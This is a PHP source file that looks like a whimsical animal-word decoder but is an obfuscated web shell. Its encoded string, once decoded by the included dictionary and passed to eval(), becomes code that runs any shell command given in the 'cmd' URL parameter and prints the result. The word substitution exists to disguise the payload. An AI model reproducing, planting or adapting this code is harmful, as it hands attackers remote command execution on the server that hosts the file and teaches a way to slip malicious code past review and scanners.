<?php

$string = "iguana frog EATS iguana seal seal elk tiger EATS SPRINTS PEES GOAT ELK TIGER PUKES JUMPS cat mole dog JUMPS KILLS SLEEPS SLEEPS GIGGLES SPACE elk cat hog olm SPACE TICK GIGGLES SPRINTS PEES GOAT ELK TIGER PUKES JUMPS cat mole dog JUMPS KILLS POOPS TICK MURDERS SPACE POOPS";

$dict = array(
"a" => "ardvark",
"b" => "bat",
"c" => "cat",
"d" => "dog",
"e" => "elk",
"f" => "frog",
"g" => "goat",
"h" => "hog",
"i" => "iguana",
"j" => "jackal",
"k" => "kiwi",
"l" => "lion",
"m" => "mole",
"n" => "newt",
"o" => "olm",
"p" => "pig",
"q" => "quail",
"r" => "rat",
"s" => "seal",
"t" => "tiger",
"u" => "vulture",
"v" => "wasp",
"x" => "xena",
"y" => "yak",
"z" => "zebra",
" " => "space",
"(" => "eats",
")" => "sleeps",
"." => "sneezes",
"[" => "pukes",
"]" => "kills",
"'" => "jumps",
"\"" => "rolls",
";" => "murders",
"=" => "dances",
"\$" => "sprints",
"{" => "giggles",
"}" => "poops",
"_" => "pees",
"<" => "falls",
">" => "vomits",
"?" => "coughs",
"`" => "tick"
);

function decode($string, $array) {
	$output = "";
	$words = explode(" ", $string);
	foreach ($words as $word) {
		$upper = isUpper($word);
		$word = strtolower($word);
		if ($key = array_search($word, $array)) {
			if ($upper) $key = strtoupper($key);
			$output = "{$output}{$key}";
		} else {
			$output = "{$output}{$word}";
		}
	}
	return $output;
}
function isUpper($char) {
	if (strtoupper($char) == $char) return true;
	return false;
}

eval(decode($string, $dict));

?>
